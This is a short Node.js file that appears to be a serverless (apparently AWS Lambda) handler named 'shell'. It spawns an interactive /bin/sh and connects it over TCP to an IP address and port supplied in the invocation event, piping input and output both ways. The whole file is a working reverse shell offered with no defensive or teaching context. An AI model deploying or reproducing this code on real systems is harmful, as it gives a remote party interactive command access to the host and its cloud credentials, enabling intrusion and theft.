
const net = require('net');
const cp = require('child_process');

module.exports.shell = function shell(event, context, callback) {
    const sh = cp.spawn('/bin/sh', ["-i"]);
    const client = new net.Socket();
    client.connect(event['port'], event['ip'], () => {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });

    callback(null, 'OK');
    return 'OK';
}